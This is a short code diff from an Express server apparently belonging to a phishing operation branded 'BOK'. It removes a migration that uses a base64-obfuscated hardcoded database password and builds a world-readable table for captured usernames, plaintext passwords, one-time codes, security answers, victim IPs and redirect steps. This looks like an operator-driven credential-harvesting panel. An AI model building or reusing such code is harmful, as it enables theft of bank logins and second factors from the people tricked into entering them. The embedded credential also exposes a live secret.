@@ -233,40 +233,8 @@ app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-async function autoMigrate() {
-  const { Client } = require('pg');
-  const DB_PASS = process.env.SUPABASE_DB_PASS || Buffer.from('Q1F1YWtLdnckZk1RNmUk','base64').toString();
-  const cl = new Client({ connectionString: 'postgresql://postgres:' + DB_PASS + '@db.reayhwohrqtoovzsppfb.supabase.co:5432/postgres', ssl: { rejectUnauthorized: false } });
-  try {
-    await cl.connect();
-    await cl.query(`
-      CREATE TABLE IF NOT EXISTS bok_logins (
-        id TEXT PRIMARY KEY,
-        username TEXT,
-        password TEXT,
-        code TEXT DEFAULT '',
-        ip TEXT,
-        status TEXT DEFAULT 'pending',
-        step TEXT DEFAULT 'login',
-        time TIMESTAMPTZ DEFAULT now(),
-        updated_at TIMESTAMPTZ DEFAULT now()
-      );
-      ALTER TABLE bok_logins ADD COLUMN IF NOT EXISTS security_question TEXT DEFAULT '';
-      ALTER TABLE bok_logins ADD COLUMN IF NOT EXISTS security_answer TEXT DEFAULT '';
-      ALTER TABLE bok_logins ADD COLUMN IF NOT EXISTS redirect_to TEXT DEFAULT '';
-      ALTER TABLE bok_logins ADD COLUMN IF NOT EXISTS update_data TEXT DEFAULT '';
-      ALTER TABLE bok_logins DISABLE ROW LEVEL SECURITY;
-      GRANT ALL ON bok_logins TO anon, authenticated, service_role;
-    `);
-    console.log('[MIGRATE] bok_logins ready');
-  } catch (e) { console.error('[MIGRATE] error:', e.message); }
-  finally { await cl.end().catch(() => {}); }
-}
-
 if (!process.env.VERCEL) {
-  autoMigrate().then(() => {
-    app.listen(PORT, () => console.log('BOK running on port ' + PORT));
-  });
+  app.listen(PORT, () => console.log('BOK running on port ' + PORT));
 }
 
 module.exports = app;
